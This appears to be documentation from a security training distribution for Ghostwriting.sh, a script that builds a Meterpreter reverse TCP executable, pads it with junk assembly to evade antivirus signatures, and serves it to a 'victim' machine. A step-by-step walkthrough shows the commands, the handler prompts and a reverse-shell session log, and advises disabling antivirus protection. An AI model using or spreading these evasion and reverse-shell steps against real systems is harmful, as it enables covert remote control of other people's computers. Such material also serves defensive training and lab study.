
Ghostwriting.sh
===============

Description
-----------
Ghostwriting is a method of anti-virus bypass utilizing binary deconstruction, insertion of arbitrary assembly code, and reconstruction.
We will make use of built in metasploit tools to perform the actions listed above.  Ghostwriting.sh is a tool used to automate the process.

Install Location
----------------

`/opt/ghostwriting/`

Usage
-----

Ghostwriting.sh is quite easy to use.  Simply change directory to the install location, 
run the script, and follow the prompts.

Let me show you an example.

Video Walkthrough
-----------------

<video controls>
  <source src="Videos/1_550_Ghost.mp4">
  <source src="https://onedrive.live.com/download.aspx?cid=8D6C4317A39E3D29&resid=8D6C4317A39E3D29%2155674&canary=">
 <p>Your browser does not support html5 video.</p>
</video>

Example 1: Obfuscating an executable with Ghostwriting.sh
---------------------------------------------------------

Let's first launch the script

`~$` **`cd /opt/ghostwriting/`**

`/opt/ghostwriting$` **`sudo ./ghostwriting.sh`**

Ghostwriting will first download and install any missing gems it may need.  It will then create a 
meterpreter reverse tcp binary ready to connect back to your machine's private IP address.
Next it will disassemble that executable, and insert junk code as a form of signature evasion.
Finally it will reassemble the binary with the junk code inside, and open a webserver so you can 
transfer the file to your victim machine.

        ****************************************************
        Opening webserver on 192.168.27.171:8000 for file transfer
        Ctrl+C to continue after file transfer
        ****************************************************
        Serving HTTP on 0.0.0.0 port 8000 ...

On your victim machine, open a web browser, and navigate to the ip address of your ADHD machine.
You should see two files.  Click to download "EveryVillainIsLemons.exe".

![Downloads in Chrome](Ghostwriting.sh_files/downloads.png)

Here is the moment of truth, depending on your AV this specific file may or may not be detected 
and block upon download (or later upon execution).  If you need to, go ahead and disable your AV's 
real-time protection.  This script is a demonstration tool more than anything.  It can however be 
modified to be hyper effective.

Once you have the file downloaded, go ahead and head over to your terminal in ADHD and 
press **`Ctrl + C`** to stop the web server.

Ghostwriting.sh will now ask you if you would like to start the payload handler, tell it yes (y).

        File Transfer Complete, probably...
        Would you like to start the handler now? [y/N]
        y
        Starting Handler
        LHOST => 192.168.27.171
        LPORT => 8080
        [*] Started reverse handler on 192.168.27.171:8080
        [*] Starting the payload handler...

It will then launch metasploit's reverse shell handler.

To create a session, back on your victim machine, simply run the executable file "EveryVillainIsLemons.exe"

The reverse handler on ADHD should receive the incoming connection and launch a session for you.

        [*] Sending state (769536 bytes) to 192.168.27.1
        [*] Meterpreter session 1 opened (192.168.27.171:8080 -> 192.168.27.1:9832) at 2014-06-30 12:41:33
    
        meterpreter \>

There you go, happy pwning!


